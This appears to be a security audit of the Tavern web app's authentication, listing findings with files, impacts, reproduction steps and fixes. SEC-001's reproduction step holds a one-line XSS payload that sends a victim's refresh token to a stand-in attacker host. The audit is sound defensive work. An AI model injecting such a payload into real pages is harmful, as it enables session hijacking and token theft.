# Security & Auth Review

## Summary

Tavern's authentication core is well-constructed: Argon2id is used with strong
parameters, JWT secrets are enforced to a minimum of 32 bytes, refresh tokens
are stored as SHA-256 hashes, token rotation with reuse detection is implemented,
and the CORS wildcard trap is caught at startup. However, three issues demand
immediate attention: both JWTs and refresh tokens are stored in `localStorage`
(exposing them to any XSS), the invite `uses` counter is incremented outside a
row-level lock (allowing races that bypass a `maxUses: 1` gate), and there is no
password-change endpoint at all, meaning a compromised credential cannot be
rotated without deleting the account.

---

## Critical Findings

### [SEC-001] Refresh token stored in `localStorage` — full XSS theft

- **Severity:** CRITICAL
- **File:** `apps/web/src/lib/api-client.ts:24-26`
- **Issue:** Both `accessToken` and `refreshToken` are persisted in
  `localStorage` under well-known keys (`tavern.access`, `tavern.refresh`).
  Any JavaScript running in the same origin — including injected scripts via
  stored XSS in message content, display names, or any user-controlled field
  that reaches the DOM without escaping — can read these values with a single
  `localStorage.getItem()` call.
- **Impact:** An attacker who exploits any XSS vector can steal both tokens.
  The access token gives 15 minutes of authenticated API access; the refresh
  token is valid for 30 days and silently issues new access tokens, giving
  persistent session takeover that survives the victim closing their browser.
  The refresh token hash in the DB does not protect against this because the
  attacker extracts the plaintext before it reaches the server.
- **Repro:** Inject `<script>fetch("https://attacker.example/"+localStorage.getItem("tavern.refresh"))</script>`
  into any unsanitized field that renders as HTML; the refresh token arrives at
  the attacker's endpoint.
- **Fix:** Replace `localStorage` with `HttpOnly; Secure; SameSite=Strict`
  cookies for both tokens. The API should `Set-Cookie` on login/register/refresh
  and accept the cookie on all authenticated endpoints alongside (or instead of)
  the `Authorization: Bearer` header. Alternatively, store only the short-lived
  access token in memory (a module-level variable) and use an HttpOnly cookie
  exclusively for the refresh token; this minimises exposure if XSS occurs.

---

### [SEC-002] Invite `uses` counter race condition — maxUses bypass

- **Severity:** CRITICAL
- **File:** `apps/api/src/services/auth-service.ts:48-88`
- **Issue:** The registration flow reads the invite row to check
  `invite.uses >= invite.maxUses`, then later (inside a transaction) calls
  `tx.invite.update({ data: { uses: { increment: 1 } } })`. Between the
  read and the write the uses value is not locked. Two concurrent registrations
  arriving simultaneously with the same invite code both read `uses = 0`,
  both pass the `>= maxUses` check, both create a user, and both increment —
  leaving `uses = 2` against a `maxUses = 1` gate.
- **Impact:** A single-use invite code (e.g., a targeted invitation meant for
  exactly one person) can be consumed by multiple concurrent registrations,
  breaking the access-control model of invite-only registration.
- **Repro:** Send two POST `/api/auth/register` requests with the same
  `inviteCode` and `maxUses=1` simultaneously using parallel HTTP clients.
- **Fix:** Replace the read-then-increment pattern with an atomic conditional
  update inside the transaction:
  ```sql
  UPDATE "Invite"
    SET uses = uses + 1
    WHERE id = $1
      AND (max_uses IS NULL OR uses < max_uses)
      AND revoked_at IS NULL
  RETURNING *
  ```
  If no row is returned, the invite was exhausted. Alternatively, add a
  `SELECT ... FOR UPDATE` before the check inside the Prisma transaction so
  Postgres locks the row for the duration of the transaction.

---

### [SEC-003] No password-change or password-reset endpoint

- **Severity:** CRITICAL
- **File:** `apps/api/src/routes/auth.ts` (absent), `apps/api/src/services/auth-service.ts` (absent)
- **Issue:** There is no route for changing an existing password, and no
  password-reset (forgot-password) flow. A `grep` over all route files finds
  zero matches for `password`, `changePassword`, or `reset` outside of the
  `argon2` hashing call in `passwords.ts`.
- **Impact:** (1) If a user's password is compromised, they have no way to
  change it without manual DB intervention. (2) There is no mechanism to
  revoke all existing sessions when a password is changed — a standard
  security requirement — because the feature does not exist. (3) Users are
  permanently locked out if they forget their password.
- **Repro:** Attempt to find any auth route that accepts a current or new
  password for an already-authenticated user — none exists.
- **Fix:** Implement `PATCH /api/auth/password` requiring `currentPassword` +
  `newPassword`. After Argon2 verification of `currentPassword`, hash the
  new value, update `User.passwordHash`, and revoke all sessions except the
  current one via
  `prisma.session.updateMany({ where: { userId, id: { not: sessionId } }, data: { revokedAt: new Date() } })`.

---

### [SEC-004] Bootstrap endpoint accessible without rate limiting on `bootstrap-status`

- **Severity:** CRITICAL (conditional — see note)
- **File:** `apps/api/src/routes/auth.ts:37-41`
- **Issue:** `GET /api/auth/bootstrap-status` is unauthenticated and not
  rate-limited (no `config: { rateLimit: ... }` override; it falls through to
  the global 300 req/min limit). More critically, the bootstrap race condition
  in the `POST /api/auth/bootstrap` handler is technically mitigated by the
  Prisma transaction's `count()` check, but only if Postgres serialisation
  is correct. The transaction uses the default `READ COMMITTED` isolation level.
  Under `READ COMMITTED` two concurrent transactions can both read `count = 0`,
  both pass the guard, and both attempt to `INSERT` the same user. The
  `@unique` constraint on `username`/`email` will make the second insert fail,
  but the transaction will throw an unhandled Prisma `P2002` unique-constraint
  error rather than the intended 409 `CONFLICT` — meaning the second request
  gets an opaque 500 instead of a clean conflict response, and the partial
  transaction state is uncertain.
- **Impact:** In a window of milliseconds at first boot, a race between two
  browsers hitting `/api/auth/bootstrap` could result in one getting a 500
  response after the admin user was already created, causing confusion about
  whether setup succeeded.
- **Fix:** Use `SERIALIZABLE` isolation or a Postgres advisory lock around
  the bootstrap transaction. Alternatively, catch Prisma `P2002` errors
  inside the transaction and re-throw as `TavernError.conflict(...)` so both
  paths surface a 409.

---

## High Findings

### [SEC-005] JWT `audience` claim not set or validated

- **Severity:** HIGH
- **File:** `apps/api/src/lib/jwt.ts:36-42, 46-53, 58-61, 76-80`
- **Issue:** `JwtService.signAccess` and `signRefresh` set an issuer (`iss`)
  but never set an `audience` (`aud`) claim. `jwtVerify` likewise does not
  specify `audience` in its options. Access tokens and refresh tokens therefore
  share the same issuer, distinguished only by the `typ` custom claim.
- **Impact:** While the `typ` check (`payload.typ !== 'access'`) provides
  practical separation, an access token could theoretically be presented to
  the refresh endpoint or vice versa if a code path misroutes the
  verification. The `aud` claim is a defence-in-depth mechanism designed
  specifically for this scenario and is expected by OIDC / OAuth 2 clients.
  More practically, if a second service is added that also accepts the same
  `issuer` secret, tokens minted for one service would be accepted by the other.
- **Fix:** Add `audience: 'tavern-api'` to `SignJWT.setAudience()` in both
  sign methods, and add `audience: 'tavern-api'` to the `jwtVerify` options
  in both verify methods.

---

### [SEC-006] Login brute-force lockout resets counter to zero on threshold hit

- **Severity:** HIGH
- **File:** `apps/api/src/services/auth-service.ts:246-255`
- **Issue:** When `nextAttempts >= FAILED_LOGIN_LOCKOUT_THRESHOLD` (10), the
  code sets `failedLoginAttempts: reachedThreshold ? 0 : nextAttempts`. The
  counter is reset to zero at the exact moment the lock is applied. After the
  15-minute lock expires, an attacker starts a fresh 10-attempt window with no
  history of prior abuse. A distributed slow-and-low attack can iterate
  indefinitely: try 9 times, wait for lock to expire, repeat — each cycle
  testing 9 passwords with no accumulating penalty.
- **Impact:** With the 20 req/min rate limit on `/auth/login`, an attacker can
  attempt 9 passwords per 15-minute lock window without ever triggering a
  permanent or escalating lockout. Over 24 hours this yields ~864 attempts per
  account.
- **Fix:** Do not reset the counter to zero; leave it at the threshold value so
  any additional failure after a lock expires re-locks immediately. Consider an
  exponential backoff: first lock 15 min, second 1 hour, third 24 hours, with
  the counter only reset on a successful login.

---

### [SEC-007] Login rate limit allows 20 attempts/minute — insufficient for credential stuffing

- **Severity:** HIGH
- **File:** `apps/api/src/routes/auth.ts:69`
- **Issue:** The `/auth/login` route is rate-limited to `max: 20` per minute
  per IP. This is a global per-IP limit applied by `@fastify/rate-limit`, but
  the server sets `trustProxy: true` unconditionally. In production behind a
  reverse proxy, the client IP is taken from `X-Forwarded-For`, which a
  sophisticated attacker can spoof or rotate through proxies. The 20/min limit
  also allows 1200 attempts per hour from a single IP before being throttled,
  which is comfortable for credential-stuffing tools. There is no per-account
  rate limit at the HTTP layer (only the per-account DB lockout at 10 attempts).
- **Impact:** Attackers who rotate IPs or forge `X-Forwarded-For` headers can
  bypass rate limiting. Even without bypass, 20/min is generous for a login
  endpoint.
- **Fix:** Reduce to `max: 5, timeWindow: '1 minute'` for login. Consider
  adding a per-account rate limit keyed on the identifier (not just IP).
  Document the expected reverse-proxy configuration and consider validating the
  `X-Forwarded-For` header against a configurable `TRUSTED_PROXY_CIDRS` list
  rather than trusting all proxies unconditionally.

---

### [SEC-008] No Content-Security-Policy header on API responses

- **Severity:** HIGH
- **File:** `apps/api/src/app.ts` (absent), `apps/web/nginx.conf`
- **Issue:** The nginx config (`nginx.conf:76-78`) sets `X-Content-Type-Options`,
  `X-Frame-Options DENY`, and `Referrer-Policy`, but does not set a
  `Content-Security-Policy` header. No CSP is set in the API layer either. The
  application relies on React's default output escaping to prevent XSS, but
  without CSP, a single bypassed escape (dangerouslySetInnerHTML, a third-party
  component, a dependency vulnerability) gives an attacker unrestricted script
  execution including the ability to read `localStorage` tokens (SEC-001).
- **Impact:** XSS attacks have maximum impact — no CSP means no restriction on
  inline scripts, `eval`, or exfiltration to arbitrary domains.
- **Fix:** Add a CSP header in nginx (and as a fallback in the Fastify response
  pipeline):
  ```
  Content-Security-Policy: default-src 'self'; script-src 'self'; connect-src 'self' wss:; img-src 'self' data: blob:; media-src 'self' blob:; style-src 'self' 'unsafe-inline'; frame-ancestors 'none'; base-uri 'self'; form-action 'self';
  ```
  This is a starting point — adjust `connect-src` to include the LiveKit URL
  when voice is configured.

---

### [SEC-009] Session model has no idle-timeout and no per-user session cap

- **Severity:** HIGH
- **File:** `packages/db/prisma/schema.prisma:79-94`, `apps/api/src/services/auth-service.ts:308-338`
- **Issue:** Sessions have a fixed `expiresAt` (default 30 days) but no
  `lastSeenAt` / `lastActiveAt` column and no idle-timeout enforcement. A
  session that has not been used for 29 days remains valid. Additionally,
  `issueSession` creates a new session on every login/register/bootstrap with
  no cap on concurrent sessions per user. An account with a compromised
  password can accumulate hundreds of live sessions with no automatic cleanup.
- **Impact:** (1) Stolen sessions remain valid long after the user last
  actively used the application. (2) There is no way for a user or admin to
  see "all active sessions" and terminate specific ones (the `GET /api/me`
  response does not expose sessions).
- **Fix:** Add `lastSeenAt DateTime?` to the `Session` model. Update it on
  every authenticated request (or batch-update it). Add a configurable idle
  timeout (e.g., 7 days default). Add a `MAX_SESSIONS_PER_USER` guard in
  `issueSession` that evicts the oldest active sessions when exceeded (e.g.,
  keep the 10 most-recent, revoke the rest).

---

### [SEC-010] `@fastify/cookie` installed but cookies not used for token delivery

- **Severity:** HIGH (potential confusion / unused dependency)
- **File:** `apps/api/package.json:18`
- **Issue:** `@fastify/cookie` is listed as a production dependency but is not
  registered in `app.ts` and no route sets or reads cookies. This creates
  ambiguity: if a future developer adds cookie reads without properly
  registering the plugin, the behaviour will be silently wrong. More
  importantly, the absence of actual cookie usage means the fix for SEC-001
  (HttpOnly cookie storage) has not been implemented despite the dependency
  being present.
- **Impact:** False sense of security; the cookie infrastructure exists but
  provides no actual security hardening.
- **Fix:** Either (a) implement HttpOnly cookie delivery for tokens (which
  resolves SEC-001 and makes this dependency useful), or (b) remove
  `@fastify/cookie` until it is needed to avoid dependency bloat.

---

## Medium Findings

### [SEC-011] `argon2.verify` error uses `console.error` instead of structured logger

- **Severity:** MEDIUM
- **File:** `apps/api/src/lib/passwords.ts:22`
- **Issue:** The catch block in `verifyPassword` calls `console.error(...)`.
  The rest of the application uses Pino (via `app.log` / `req.log`) for
  structured JSON logging. `console.error` bypasses Pino, so the error is not
  captured with request context (trace IDs, user IDs), not formatted as JSON,
  and not forwarded to any log aggregator that reads Pino's output stream.
- **Impact:** An argon2 engine failure (OOM, native binding crash) would be
  silently dropped in production monitoring, delaying diagnosis. Also
  constitutes a logging inconsistency that could confuse operators.
- **Fix:** Accept a `Logger` parameter in `verifyPassword` (or use a module-level
  Pino instance) and replace `console.error` with `logger.error({ err }, 'argon2 verify error')`.

---

### [SEC-012] `console.warn` in `gateway-broker.ts` — same structured logging gap

- **Severity:** MEDIUM
- **File:** `apps/api/src/services/gateway-broker.ts:127`
- **Issue:** `console.warn('[gateway-broker] falling back to in-process broker:', err)` bypasses Pino.
- **Impact:** Redis broker initialization failures are not captured in
  structured logs, making Redis connectivity issues invisible in log aggregation.
- **Fix:** Use `app.log.warn(...)` or pass a logger instance to the broker
  factory.

---

### [SEC-013] `disableRequestLogging: true` in test mode hides security-relevant request logs

- **Severity:** MEDIUM
- **File:** `apps/api/src/app.ts:55`
- **Issue:** `disableRequestLogging: opts.config.NODE_ENV === 'test'` is
  a reasonable test optimisation, but the flag is evaluated from `NODE_ENV`
  rather than a dedicated `DISABLE_REQUEST_LOGGING` variable. If `NODE_ENV`
  is accidentally set to `test` in a staging environment, all incoming
  request logs (including security-relevant auth attempts) are suppressed.
- **Fix:** Use a dedicated `LOG_REQUESTS` env variable (boolean, default `true`).

---

### [SEC-014] Invite `uses` not validated at join time under concurrent load

- **Severity:** MEDIUM
- **File:** `apps/api/src/routes/invites.ts:132-156`
- **Issue:** The server-join invite path (`POST /api/invites/:code/join`) has
  the same read-then-increment pattern as the registration path (SEC-002). The
  `uses >= maxUses` check at line 132 and the `uses: { increment: 1 }` at
  line 148 are not atomically linked.
- **Impact:** A `maxUses: 1` server invite could be used by two concurrent
  callers. The second `serverMember.create` may fail with a unique-constraint
  error (already a member), but the invite counter would be incremented twice.
- **Fix:** Apply the same atomic `UPDATE ... WHERE uses < max_uses RETURNING *`
  fix as SEC-002.

---

### [SEC-015] Default example credentials in `.env.example` shipped in repo

- **Severity:** MEDIUM
- **File:** `.env.example:87-88`
- **Issue:** `.env.example` contains `SEED_ADMIN_PASSWORD=change-me-in-dev`
  and `POSTGRES_PASSWORD=tavern-dev` as defaults that are used by `pnpm db:seed`
  and `docker-compose`. If an operator copies `.env.example` to `.env` and
  runs the application without changing these values, the seed admin account
  and the database have well-known passwords.
- **Impact:** An attacker who knows Tavern is deployed can attempt
  `admin@example.com` / `change-me-in-dev` on the login endpoint. If the
  operator also left `DATABASE_URL` pointing at an exposed port, the Postgres
  password `tavern-dev` could be used directly.
- **Fix:** Add startup validation in `loadConfig` that refuses to start in
  production if `JWT_ACCESS_SECRET` or `JWT_REFRESH_SECRET` are still the
  placeholder values. Consider adding similar checks for the seed password.
  Document prominently that the seed credentials must be changed.

---

### [SEC-016] No `Strict-Transport-Security` (HSTS) header

- **Severity:** MEDIUM
- **File:** `apps/web/nginx.conf` (absent)
- **Issue:** The nginx config does not set `Strict-Transport-Security`. In
  production, without HSTS, a browser that visits the site over HTTP before
  HTTPS is set up will not be upgraded, and cookies or tokens could be sent
  over plaintext connections.
- **Fix:** Add `add_header Strict-Transport-Security "max-age=63072000; includeSubDomains; preload";`
  to the nginx server block. This should only be enabled after verifying TLS
  is properly configured end-to-end (typically via Traefik as shown in `infra/`).

---

### [SEC-017] `trustProxy: true` is unconditional — spoofable `X-Forwarded-For`

- **Severity:** MEDIUM
- **File:** `apps/api/src/app.ts:54`
- **Issue:** `trustProxy: true` tells Fastify to read the client IP from the
  `X-Forwarded-For` header without validating that the header arrived from a
  trusted proxy. In deployments where the API is directly internet-accessible
  (native dev without Traefik, or a misconfigured production setup), an attacker
  can set `X-Forwarded-For: 127.0.0.1` to appear to come from localhost, or
  rotate through arbitrary IP addresses to evade per-IP rate limiting.
- **Fix:** In production, restrict `trustProxy` to the actual proxy CIDR:
  `trustProxy: '10.0.0.0/8'` (or the appropriate range). Expose a
  `TRUSTED_PROXY_CIDRS` env variable.

---

### [SEC-018] Server-scoped invite accepted for instance registration

- **Severity:** MEDIUM
- **File:** `apps/api/src/services/auth-service.ts:48-55`
- **Issue:** The register endpoint validates the invite but does not check
  `invite.scope`. A server-scoped invite (created via `POST /api/invites`
  with `scope: 'server'`) can be used to create an account via
  `POST /api/auth/register`, even though server-scoped invites are intended
  only to grant server membership to existing users. The scope enforcement
  in `POST /api/invites/:code/join` (which rejects `scope !== 'server'`) runs
  in the opposite direction to what is needed here.
- **Impact:** A user who has CREATE_INVITES permission on a server can create
  a server-scoped invite and give it to anyone, effectively granting them
  instance-level account creation — bypassing the instance admin's control over
  who can register.
- **Fix:** Add `if (invite.scope !== 'instance') throw new TavernError(ErrorCodes.INVALID_INVITE, ...)` in the `register` method after the invite lookup.

---

### [SEC-019] `vite` path traversal in `.map` handling (dev/test dependency)

- **Severity:** MEDIUM
- **File:** `apps/web/package.json`, `apps/api/package.json` (transitive via `vitest`)
- **Issue:** `pnpm audit` reports GHSA-4w7w-66w2-5vf9: Vite <= 6.4.1 has a
  path traversal vulnerability in optimized deps `.map` handling. The affected
  version appears in the test dependency tree via `vitest`.
- **Impact:** In a development environment, a malicious dependency or crafted
  request could read arbitrary files from the host via Vite's dev server. Does
  not affect the production Fastify API.
- **Fix:** Update `vitest` to a version that pulls in `vite >= 6.4.2`, or add
  a `pnpm.overrides` entry to pin `vite` to a patched version.

---

## Low Findings

### [SEC-020] Refresh token rate limit is too high at 60/minute

- **Severity:** LOW
- **File:** `apps/api/src/routes/auth.ts:78`
- **Issue:** `/auth/refresh` allows 60 requests per minute. A legitimate client
  performs at most one refresh per access-token expiry window (15 minutes).
  60/min leaves room for automated refresh probing.
- **Fix:** Lower to `max: 10, timeWindow: '1 minute'`.

---

### [SEC-021] `bootstrap-status` endpoint not rate-limited

- **Severity:** LOW
- **File:** `apps/api/src/routes/auth.ts:37-41`
- **Issue:** `GET /api/auth/bootstrap-status` falls through to the global
  300 req/min limit. An attacker probing whether an instance has been
  bootstrapped can call this endpoint freely without restriction.
- **Impact:** Minor information disclosure; the response reveals whether the
  instance has any users. Low practical impact since bootstrap status is
  inherent to the first-run UX.
- **Fix:** Add `config: { rateLimit: { max: 30, timeWindow: '1 minute' } }`.

---

### [SEC-022] `livekit-api-secret` placeholder in test config

- **Severity:** LOW
- **File:** `apps/api/test/auth.test.ts:71`
- **Issue:** `LIVEKIT_API_SECRET: 'devsecret-change-me'` is present in the
  test config. This is a test file with clearly fake credentials, so it is not
  an actual leak. However, the string `change-me` in a secret field inside a
  committed file could trigger secret-scanning tools and generate false positives.
- **Fix:** Use a more obviously synthetic value like `test-livekit-secret-not-real`.

---

### [SEC-023] `X-Device-Name` header accepted without authentication boundary

- **Severity:** LOW
- **File:** `apps/api/src/routes/auth.ts:23-32`
- **Issue:** The `X-Device-Name` header (max 200 chars, truncated) is
  accepted on all auth routes including `/auth/bootstrap` and stored verbatim
  in the `Session.deviceName` column. The value is truncated but otherwise
  unvalidated (any printable string is accepted). This information is stored
  permanently and could be used to inject unexpected content into session
  listings if that data is later rendered.
- **Impact:** Low — the device name is not rendered in the current UI, but
  if a session-management page is added, stored XSS payloads in `deviceName`
  could fire.
- **Fix:** Apply `sanitize-html` (already a dependency) or restrict to a
  safe character set (printable ASCII, max 200 chars) when saving `deviceName`.

---

### [SEC-024] `undici` vulnerable dependencies in dev/test packages

- **Severity:** LOW (dev-only path)
- **File:** `apps/api/package.json` (via `testcontainers`)
- **Issue:** `pnpm audit` reports GHSA-vrm6-8vpv-qv8q and GHSA-v9p9-hfj2-hcw8
  (HIGH) plus three moderate findings in `undici < 6.24.0`, pulled transitively
  by `@testcontainers/postgresql` and `testcontainers`. These are test-only
  dependencies that do not ship in the production Docker image, but they run
  during CI.
- **Impact:** A malicious test environment that interacts with the
  `testcontainers`-managed PostgreSQL could trigger memory exhaustion via the
  WebSocket permessage-deflate issue. Practical risk in CI is low.
- **Fix:** Pin `undici` to `>=6.24.0` via `pnpm.overrides`, or update
  `testcontainers` to a version that ships a patched `undici`.

---

### [SEC-025] `nginx.conf` missing `Permissions-Policy` header

- **Severity:** LOW
- **File:** `apps/web/nginx.conf`
- **Issue:** The nginx server block sets three security headers but omits
  `Permissions-Policy` (formerly Feature-Policy), which controls browser APIs
  such as camera, microphone, and geolocation. Given that Tavern uses camera
  and microphone for voice, explicit policy control reduces the attack surface
  for any injected script that tries to access these APIs.
- **Fix:** Add:
  ```
  add_header Permissions-Policy "camera=(self), microphone=(self), geolocation=(), payment=()";
  ```

---

## Positive Notes

The following items were reviewed and found to be correctly implemented:

- **Argon2id parameters** (`passwords.ts`): `type: argon2id`, `memoryCost: 65536` (64 MiB),
  `timeCost: 3`, `parallelism: 1` — meets OWASP recommendations for interactive authentication.
- **JWT secret minimum length**: `z.string().min(32)` enforced at startup via Zod in `config.ts`; the example
  file guides to `openssl rand -hex 48` (48 bytes = 96 hex chars, well above minimum).
- **Algorithm pinned to HS256**: `algorithms: ['HS256']` passed to `jwtVerify` in both `verifyAccess` and
  `verifyRefresh`; `setProtectedHeader({ alg: 'HS256' })` on sign — the `alg: none` attack is not possible.
- **Separate secrets for access/refresh tokens**: `JWT_ACCESS_SECRET` and `JWT_REFRESH_SECRET` are distinct
  keys, so a refresh token cannot be verified against the access key or vice versa (even without an `aud` claim).
- **Refresh token hash storage**: The refresh token is stored as `sha256(token)` in `Session.refreshTokenHash`;
  plaintext tokens are never persisted in the database.
- **Refresh token rotation with reuse detection**: On every `/auth/refresh`, the old session is revoked and a
  new one is issued. If a revoked token is reused, ALL sessions for that user are immediately revoked (auth-service.ts:278-283).
- **Session revocation on logout**: `logout()` sets `Session.revokedAt`; every authenticated request in
  `plugins/auth.ts` checks `session.revokedAt` before proceeding.
- **Session check on every request**: `tryAuthenticate` in `plugins/auth.ts` validates not just the JWT
  signature but also queries the DB to confirm the session is not revoked or expired.
- **CORS wildcard rejection**: `parseAllowedOrigins` in `app.ts` explicitly rejects `*` with a descriptive
  error at startup.
- **CORS credentials + origin**: `credentials: true` is paired with an explicit origin allowlist, not a wildcard.
- **Uniform credential error messages**: Login returns the same `INVALID_CREDENTIALS` / 401 for
  "user not found" and "wrong password", preventing username enumeration.
- **Username/email case normalization**: Both registration and login normalize to lowercase before comparison,
  preventing case-variant account collisions.
- **Inject hardening in `local-files.ts`**: Path traversal is prevented with a `KEY_PATTERN` regex plus
  explicit `..` / empty-segment checks.
- **Zod validation on all request bodies**: Every route parses `req.body` through a Zod schema before
  touching any field.
- **No raw SQL in auth paths**: All database access uses the Prisma ORM; there are no string-concatenated
  queries that could enable SQL injection.
- **`@fastify/sensible`** registered: Provides well-formed error responses and sane defaults.
- **Error handler sanitises stack traces**: `registerErrorHandler` returns only a generic
  `INTERNAL_ERROR` message for unhandled errors, not stack traces or internal error details.
- **Invite expiry and revocation checked**: Both `revokedAt` and `expiresAt` are checked for invites before
  accepting registration or server-join.
- **Instance-admin check for instance invites**: Creating or revoking an instance-scoped invite requires
  `isInstanceAdmin: true` (invites.ts:56-60).
- **Attachment quarantine bucket blocked**: `attachments.ts` hard-blocks streaming from the quarantine bucket
  with a 403, even if the key is somehow known.
- **X-Content-Type-Options**: Set on file-serving routes and in nginx.
